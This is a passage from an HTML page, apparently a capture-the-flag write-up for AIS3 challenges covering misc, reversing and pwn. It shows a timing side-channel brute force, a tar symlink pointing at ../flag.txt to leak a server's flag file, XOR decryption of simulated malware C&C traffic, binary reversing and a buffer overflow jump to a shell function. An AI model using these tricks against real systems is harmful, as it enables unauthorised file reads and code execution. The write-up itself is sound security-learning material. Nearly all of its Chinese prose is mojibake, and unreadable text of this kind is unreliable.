class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Haha, you lose in <span class="subst">&#123;end - start&#125;</span> milliseconds.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Oh, you win. QQ&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å¾ˆå¤šäººåœ¨é€£ç·šçš„æ™‚å€™å»ç®— cpu time æœƒæŠ–çš„å¾ˆå¤§åŠ›ï¼Œæ‰€ä»¥å¾Œä¾† server æ‡‰è©²æ˜¯æ”¹æˆç”¨æ¨¡æ“¬çš„ ( å°±æ¯”è¼ƒç©©äº† )ï¼Œå°±æ˜¯éŒ¯äº†å°±åŠ å€‹ random å° noiseï¼Œå°äº†å°±åŠ ä¸€å€‹å¤§ä¸€é»çš„å€¼ä¹‹é¡çš„ã€‚</p>
<p>æ‰€ä»¥æ¯å€‹å­—éƒ½çˆ†æœ 0 - 255ï¼Œç„¶å¾Œå–æœ€å¤§çš„å°±å¥½äº†ï¼Œå¯ä»¥æ¯æ¬¡å˜—è©¦éƒ½é€å€‹åæ¬¡å–å¹³å‡ä¹‹é¡çš„ï¼Œæˆ–æ˜¯æŠŠ log è¨˜èµ·ä¾†ï¼Œä¹‹å¾Œå¦‚æœçˆ†æœæ‰€æœ‰ byte éƒ½æ²’æœ‰é€²å±•çš„è©±å°±ï¼Œå›å»æ‰¾ç¬¬äºŒé«˜çš„ï¼Œæœƒæ¯”è¼ƒç©©ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A1r1ght_U_4r3_my_3n3nnies&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Shichirou">Shichirou</h3>
<p>é€™é¡Œè¦ <code>nc 60.250.197.227 11000</code>ï¼Œæœ‰çµ¦åŸå§‹ç¢¼ï¼Œçµ¦ä»–ä¸€å€‹ tar æª”ï¼Œä»–å¹«ä½ è§£é–‹ç„¶å¾ŒæŠŠè§£é–‹çš„ <code>guess.txt</code> è·Ÿ local çš„ <code>flag.txt</code> çš„ sha1 åšæ¯”è¼ƒï¼Œå¦‚æœä¸€æ¨£çš„è©±å°±å™´ flagã€‚<br>
tar å¯ä»¥å£“ç¸® symbolic linkï¼Œè‡ªå·±åšä¸€å€‹ symbolic link æŒ‡å‘ <code>flag.txt</code> å°±å®Œæˆäº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s ../flag.txt guess.txt</span><br><span class="line">tar -cf test.tar ./</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Clara">Clara</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ pcap æª”ï¼Œä¸€é–‹å§‹å•¥æç¤ºéƒ½æ²’æœ‰ï¼Œå¾Œä¾†æœ‰èªªæ˜¯ Malware åœ¨ monitor é›»è…¦ç„¶å¾Œå‚³ encrypted data çµ¦ C&amp;C Serverï¼Œç„¶å¾Œå‚³äº†å…©æ¬¡ä¸€æ¨£çš„è³‡æ–™ï¼Œçœ‹äº†è€åŠå¤©ï¼Œæœƒç™¼ç¾ tcp æµé‡è£¡é¢æœ‰é¡ä¼¼ AIS3 çš„å­—æ¨£ï¼Œæœ‰å…©å¤§åŒ… tcpï¼Œä¸€åŒ… 10 MB å¦ä¸€åŒ… 27 MBï¼ŒåŠ å¯†çš„è©±å¤§æ¦‚ä¹Ÿåªæœ‰ xor æ¯”è¼ƒæ­£å¸¸å§ï¼Œæ‰€ä»¥è¤‡è£½äº†ä¸€äº›éƒ¨åˆ†ç”¨ <code>xortool</code> åˆ†æï¼Œæ‰¾åˆ° key æ˜¯ <code>AIS3&#123;NO&#125;</code>ï¼Œè€Œä¸”çœ‹åˆ° PNG é–‹é ­çš„å­—æ¨£å’Œä¸€äº› xml çš„ meta dataï¼Œå°±å¯ä»¥ç¢ºå®šå‡è¨­æ­£ç¢ºä¹Ÿè§£å°äº†(æ±—ï¼Œæ—¢ç„¶å…©æ¬¡åŒ…çš„æ˜æ–‡æ˜¯ä¸€æ¨£çš„é‚£å°±æŠŠå…©åŒ…åš xor å† xor ä¸Š <code>AIS3&#123;NO&#125;</code> å°±å¾—åˆ°å¦ä¸€åŒ…çš„ key æ˜¯ <code>xSECRETx</code>ï¼Œæ¥è‘—æŠŠæ•´åŒ…æ‹¿å»åš xor æ‹‰å‡ºåœ–ç‰‡ï¼Œåœ–ç‰‡æœ‰å¥½å¹¾ MB å¾ˆå¤§ï¼Œä¸€é–‹å§‹åªæœ‰æ‹‰å‡ºä¸€å¼µåœ–ç‰‡ï¼ŒæŸå€‹å‹•æ¼«çš„åœ–ï¼Œåˆå¡äº†ä¸€ä¸‹å¾Œï¼Œç™¼ç¾é‚£åŒ…å‰é¢çš„éƒ¨åˆ†æœ‰é¡ä¼¼ header çš„æ±è¥¿ï¼Œä»–ä¸æ˜¯ 8 çš„å€æ•¸ï¼Œæˆ‘ä¸€é–‹å§‹æ˜¯ç›´æ¥ä¸ç†ä»–ï¼Œä½†æ˜¯çŒœæ¸¬å¾Œé¢ä¹Ÿæœ‰å¥½å¹¾æ®µ headerï¼Œè®“ xor æ²’å°é½Šå£æ‰ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠæ•´æ®µ data æš´åŠ› shift äº†å¹¾æ¬¡æ‹¿å» xorï¼Œå°±æ‹‰å‡ºæ‰€æœ‰ç…§ç‰‡äº†ï¼Œå…¶ä¸­ä¸€å¼µæœ‰ flagï¼Œå…¶ä»–éƒ½åƒåœ¾ï¼ŒåŸæœ¬ä¸çŸ¥é“æœ‰å¾ˆå¤šå¼µåœ–ç‰‡ï¼Œä¹Ÿä¸çŸ¥é“ flag åœ¨å“ªçš„æ™‚å€™é‚„åœ¨é–‹ <code>stegsolve</code> å’Œ <code>zsteg</code> åœ¨åœ–ç‰‡æ‰¾ flagï¼Œæµªè²»å¾ˆå¤šæ™‚é–“ã€‚<br>
ä»–çš„ packet æ˜¯å¾ˆæœ‰ç§©åºæ²’æœ‰äº‚å‚³çš„ï¼Œheader è£¡é¢å°±æ˜¯å›ºå®šå‚³ä¸€å€‹ <code>0xdeadbeeffaceb00c</code> ç„¶å¾Œ C&amp;C æŠŠå‰›å‰›é‚£æ®µ xor åŠ å¯†å›å‚³ï¼Œæ¥è‘—å¾Œé¢æª”æ¡ˆåå­—çš„å¤§å°ï¼Œå’Œæª”æ¡ˆåå­—ï¼Œæ¯å€‹éƒ½åˆ†é–‹å‚³ï¼Œæ¯å€‹éƒ½è‡ªå·±åš xor cipherï¼Œæ¥è‘—å°±æ˜¯å‚³ dataï¼Œéƒ½æ²’æœ‰èµ°æ­ªæˆ–æ˜¯æ‰é€²ä»€éº¼å‘çš„è©±é‚„æ˜¯æœ‰æ©Ÿæœƒè§£å‡ºä¾†çš„ï¼Œæˆ‘ä¹Ÿä¸å¸¸åˆ†æ packet ä¹Ÿæ²’åˆ†æéä»€éº¼æƒ¡æ„ç¨‹å¼ï¼Œç¶“é©—ä¸è¶³æ‰€ä»¥è§£å¾ˆä¹…é‚„è¦çœ‹ hint QQ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reverse">Reverse</h2>
<h3 id="TsaiBro">TsaiBro</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”é‚„æœ‰è¢«åŠ å¯†çš„ flag æª”ï¼Œè¢«åŠ å¯†çš„ flag æª”çš„ä¸€å°æ®µå¤§æ¦‚é•·ä¸‹é¢é€™æ¨£</p>
<p><code>ç™¼è²¡..ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.ç™¼è²¡........</code></p>
<p>éš¨ä¾¿ç”¨ ida çœ‹äº†ä¸€ä¸‹å¾Œï¼ŒåŠ å¯†æµç¨‹å°±æ˜¯æŠŠ flag è½‰ä¹˜ <code>flag // 8</code> å’Œ <code>flag % 8</code>ï¼Œç„¶å¾Œæ•¸å­—æ˜¯å¤šå°‘å°±è½‰ä¹˜å¤šå°‘å€‹é»ï¼Œæ‰€ä»¥æœ€å¤š 8 å€‹é»ï¼Œä¸Šé¢é‚£æ®µå°±æ˜¯ <code>[2, 7, 4, 7, 4, 1, 8]</code>ï¼Œé‚£è§£å¯†å°±åéä¾†çµ„å›å»å°±å¥½ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Fallen-Beat">Fallen Beat</h3>
<p>é€™é¡Œçµ¦äº†ä¸€éš» jar åŸ·è¡Œæª”ï¼Œè·‘èµ·ä¾†æ˜¯ä¸€å€‹ç¯€å¥éŠæˆ²ï¼Œè¦ Full Combo æ‰èƒ½æ‹¿åˆ° flagï¼Œé‚£ç›´æ¥ <code>JD-GUI</code> ä¸‹å»çœ‹ä»–ï¼Œé—œéµåœ¨ <code>PanelEnding.class</code> è£¡é¢ï¼Œå®šç¾©äº†è¢«åŠ å¯†çš„ flag é™£åˆ—ï¼Œé‚„æœ‰å¾Œé¢åš xor è§£å› flag å°å‡ºä¾†çš„éƒ¨åˆ†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; </span><br><span class="line">    <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">    <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">    <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">    <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="built_in">this</span>.flag[i % <span class="built_in">this</span>.flag.length] = (<span class="type">byte</span>)(<span class="built_in">this</span>.flag[i % <span class="built_in">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue());</span><br><span class="line">    <span class="type">String</span> <span class="variable">fff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.flag);</span><br><span class="line">    <span class="built_in">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">&quot;Flag: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; fff &#125;));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>é€™è£¡çš„ cache åŸæœ¬ä»¥ç‚ºæ˜¯å…§å»ºçš„æ±æ±ï¼Œçµæœä¸æ˜¯ï¼Œè¿½äº†ä¸€ä¸‹ç™¼ç¾åœ¨ <code>GameControl.class</code> æœ‰å®šç¾©ï¼Œæ±è¥¿æ˜¯å¾ <code>songs/gekkou/hell.txt</code> æŠ“å‡ºä¾†çš„ï¼Œé‚£å°±ç›´æ¥ç…§è‘— xor å°±è§£å‡ºä¾†äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Stand-up-Brain">Stand up!Brain</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”ï¼Œéš¨ä¾¿çœ‹äº†ä¸€ä¸‹ç™¼ç¾ä»–å¯¦åšäº† Brainfuckï¼Œç„¶å¾Œç¨‹å¼ç¢¼åœ¨åŸ·è¡Œæª”è£¡é¢ï¼Œæ‹‰å‡ºä¾†é•·é€™æ¨£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]]</span><br></pre></td></tr></table></figure>
<p>äººè…¦è·‘äº†ä¸€ä¸‹ç™¼ç¾å‰é¢ä¸€æ®µæ˜¯åœ¨åšå¾ˆå¤š if åˆ¤æ–·ï¼Œå¾Œé¢æœ‰ <code>.</code> çš„éƒ¨åˆ†æ˜¯å° flag çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># if (ptr[0] - 67) == 0</span><br><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">[</span><br><span class="line">    # if (ptr[2] - 56) == 0</span><br><span class="line">    &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">    [</span><br><span class="line">        # if (ptr[4] - 55) == 0</span><br><span class="line">        &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">        [</span><br><span class="line">            # if (ptr[6] - 54) == 0</span><br><span class="line">            &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">            [</span><br><span class="line">                # if (ptr[8] - 51) == 0</span><br><span class="line">                &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">                [</span><br><span class="line">                    # if (ptr[8] - 33) == 0</span><br><span class="line">                    &gt;---------------------------------[&gt;[-]&lt;[-]]&gt;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥åªè¦ä½ çš„è¼¸å…¥è¦æ˜¯ <code>C8763!</code> å°±æœƒé€²åˆ°å¾Œé¢å° flag çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åŸ·è¡ŒåŸæœ¬çš„ç¨‹å¼è¼¸å…¥ <code>C8763!</code> è·Ÿæ¡äººä¸€èµ·ä½¿å‡ºæ˜Ÿçˆ†æ°£æµæ–¬æ‹¿ flagï¼Œæˆ–æ˜¯ç›´æ¥å¿½ç•¥å‰é¢æŠŠå¾Œé¢é‚£æ®µè²¼åˆ°ç·šä¸Šçš„ Brainfuck Compiler åŸ·è¡Œä¸€ä¸‹ä¹Ÿå¯ä»¥æ‹¿åˆ° flagã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Th1s_1s_br4iNFUCK_bu7_m0r3_ez&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Long-Island-Iced-Tea">Long Island Iced Tea</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”é‚„æœ‰è¢«åŠ å¯†çš„ flag æª”ï¼Œè¢«åŠ å¯†çš„ flag é•·é€™æ¨£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000</span><br></pre></td></tr></table></figure>
<p>éš¨ä¾¿å˜—è©¦äº†ä¸€ä¸‹ç™¼ç¾è¶…é 8 å€‹ bytes ä¹‹å¾Œçš„éƒ½ä¸æœƒè®Šè€Œä¸”ç›´æ¥æ˜¯æ˜æ–‡äº†ï¼ŒæŠŠä¸Šé¢é‚£æ®µå¾ hex è½‰å› bytes å°±è®Šæˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x85\n*M?\xac\x14\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;\x00\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>
<p>å‰é¢ 8 å€‹ bytes å·²çŸ¥ <code>AIS3&#123;</code> 5 å€‹å­—äº†ï¼Œæ‰€ä»¥ç›´æ¥çˆ†æœå‰©ä¸‹ 3 å€‹å­—ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;</span><br></pre></td></tr></table></figure>
<h3 id="La-vie-en-rose">La vie en rose</h3>
<p>é€™é¡Œçµ¦äº†çµ¦ <code>PE</code> çš„åŸ·è¡Œæª”ï¼ŒåŸæœ¬ä»¥ç‚ºè¦é€†å‘ windows äº†ï¼Œæ‰“é–‹å¾Œçœ‹åˆ°ä¸€å † python çš„å‡½å¼åº«é‚„æœ‰ tkinterï¼Œç™¼ç¾ä»–æ˜¯ç”¨ PyInstaller åŒ…çš„ï¼Œåƒè€ƒ <a target="_blank" rel="noopener" href="http://o1o1o1o1o.blogspot.com/2016/11/python-pyinstaller-reverse-engineer.html">é€™ç¯‡</a> ç”¨å®˜æ–¹çš„ <a target="_blank" rel="noopener" href="https://github.com/pyinstaller/pyinstaller/blob/develop/archive_viewer.py">archive_viewer.py</a> æŠŠ pyc æ‹‰å‡ºä¾† ( å…¶å¯¦å¥½åƒæ˜¯ pyd æª”æ‰å°ï¼Œå¥½åƒæ ¼å¼ä¸Šå·®äº†ä¸€é» )ï¼Œåœ¨é€† pyc çš„æ™‚å€™ç¢ºå®šç‰ˆæœ¬å¾ˆé‡è¦ï¼Œæ‹‰å‡ºä¾†çš„ pyc æ²’æœ‰ magic value headerï¼Œå¯ä»¥éš¨ä¾¿å†æ’ˆå€‹æ¯”å¦‚ <code>pyimod01_os_path</code> å‡ºä¾†ï¼Œé€™å€‹å°±æœ‰ magic value æ˜¯ <code>550d 0d0a</code>ï¼Œæ‰€ä»¥æ˜¯ Python 3.8 b4 ç‰ˆï¼Œå…ˆå˜—è©¦ç”¨äº†ä¸€ä¸‹ <code>uncompyle6</code> å»é‚„åŸåŸå§‹ç¢¼ï¼Œå¯æ˜¯ä»–å™´éŒ¯ç„¶å¾Œå¤±æ•—äº†ï¼Œé‚£æˆ‘å€‘å°±ç›´æ¥çœ‹ bytecode å§ï¼Œç”¨ <code>marshal.loads</code> è¼‰å…¥ç‚º code object å†ç”¨ <code>dis.dis</code> å» disassembleï¼Œé‚ŠçŒœä»–çš„åŸå§‹ç¢¼ï¼Œå¯ä»¥é‚Šç”¨ <code>dis.dis(compile('x = 1', 'filename', 'exec'))</code> å»é©—è­‰ï¼Œçœ‹äº†ä¸€ä¸‹æœƒç™¼ç¾</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, [secret[i] ^ notes[i % <span class="built_in">len</span>(notes)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret))]))</span><br></pre></td></tr></table></figure>
<p><code>flag</code> æ˜¯ç”¨ <code>secret</code> å’Œ <code>notes</code> xor å‡ºä¾†çš„ï¼Œ<code>secret</code> æ˜¯å¯«æ­»çš„ï¼Œ<code>notes</code> æ˜¯å¾ <code>input</code> è¼¸å…¥é€²ä¾†çš„ï¼Œç„¶å¾Œåšäº†ä¸‹é¢çš„è¨ˆç®—ç®—å‡º <code>result</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">notes = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, notes))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] + notes[i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] - notes[i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>æœ€å¾ŒæŠŠ <code>result</code> è·Ÿä¸€å€‹å›ºå®šçš„é™£åˆ—åšæ¯”è¼ƒï¼Œæ‰€ä»¥æˆ‘å€‘æœ‰ <code>a+b</code> å’Œ <code>a-b</code> åªè¦æŠŠå…©å€‹åŠ èµ·ä¾†é™¤ä»¥äºŒå°±æ‹¿åˆ° <code>a</code> äº†ï¼ŒæŠŠ <code>notes</code> é‚„åŸå†è·Ÿ <code>secret</code> xor å°±å¾—åˆ° <code>flag</code> äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Uroboros">Uroboros</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”ï¼Œæ˜¯ C++ å¯«çš„ï¼Œç¸½ä¹‹å°±é€†ä»–ï¼Œç™¼ç¾ä»–æ˜¯ä¸€å€‹ circular double linked listï¼Œçµæ§‹å°±åƒä¸‹é¢é€™æ¨£å¾ˆæ™®é€šã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123; </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>* prev;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>* next;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç¸½å…±æœ‰ 314 å€‹ Nodeï¼Œå°è¼¸å…¥çš„æ¯å€‹å­—ï¼Œä»–æœƒå…ˆå¾€ä¸‹èµ° <strong>è¼¸å…¥çš„å­—ä¹˜ä¸Š 7</strong> æ¬¡ç„¶å¾ŒæŠŠèµ°åˆ°çš„é‚£å€‹ Node çš„å€¼ä¹˜ 64 åŠ ä¸Š counterï¼Œcounter å°±æ˜¯ä¸€é–‹å§‹æ˜¯ 1ï¼Œæ¯ç¶“éä¸€å€‹å­—åŠ ä¸€ï¼Œæœ€å¾ŒæŠŠæ•´æ®µè¼¸å‡ºè·ŸæŸå€‹ç­”æ¡ˆæ¯”è¼ƒï¼Œå°äº†å°±ä»£è¡¨ä½ çš„è¼¸å…¥å°±æ˜¯ flagï¼Œæ‰€ä»¥å°±ç…§è‘—è§£å›ä¾†ï¼ŒæŠŠæ•¸å­—ç•¶æˆ 64 é€²ä½æ‹†é–‹ï¼Œæ¯”å¦‚ç¬¬ 141 å€‹ Node å­˜çš„ <code>70</code> æ‹†æˆ <code>64 * 1 + 6</code>ï¼Œä»£è¡¨ç¬¬ä¸€å€‹å’Œç¬¬å…­å€‹å­—æ˜¯ â€˜Aâ€™ï¼Œå› ç‚º <code>ord('A') * 7 = 141 ( mod 341 )</code>ï¼Œå°±æ˜¯æŠŠ <code>141 * inverse(7, 341) = 65 = ord('A')</code>ï¼Œå°±é€™æ¨£ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Pwn">Pwn</h2>
<h3 id="BOF">BOF</h3>
<p>æœ€ç°¡å–®çš„ buffer overflowï¼Œè£¡é¢å·²ç¶“æœ‰ä¸€å€‹å‡½å¼ï¼Œç›´æ¥å‘¼å«å°±æ‹¿åˆ° shell äº†ï¼Œä½†æ˜¯è¨˜å¾—è¦è·³åˆ° <code>push rbp</code> ä¸‹ä¸€è¡Œï¼Œå¦‚æœè·³åˆ° <code>push rbp</code> çš„è©± stack æœƒæ²’æœ‰å°é½Š 16 çš„å€æ•¸ï¼Œåš <code>system</code> çš„æ™‚å€™æœƒé€²åˆ° child thread ç„¶å¾Œè·‘åˆ° <code>movaps XMMWORD PTR [rsp+0x40], xmm0</code> å› ç‚ºæ²’å°é½Šå°±æ›äº†ï¼Œç„¶å¾Œ child thread æ­»æ‰ <code>system</code> å°±æœƒåŸ·è¡Œå®Œè·³å‡ºä¾† ( éƒ½é‚„æ²’æ‰“åˆ°æŒ‡ä»¤ )ï¼Œå‡ºä¾†è·‘åˆ°å‡½å¼çµå°¾ <code>return</code> çš„æ™‚å€™åˆæœƒæ›æ‰ï¼Œå› ç‚ºæ­£å¸¸å‘¼å«å‡½å¼éƒ½æœƒæŠŠ return address æ”¾åˆ° stack ä¸Šï¼Œä½†æ˜¯ç›´æ¥è·³éå»å°±æ²’æœ‰æ”¾ï¼Œä»–å°±æœƒ return åˆ°å¥‡æ€ªçš„ä½ç½®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Nonsense">Nonsense</h3>
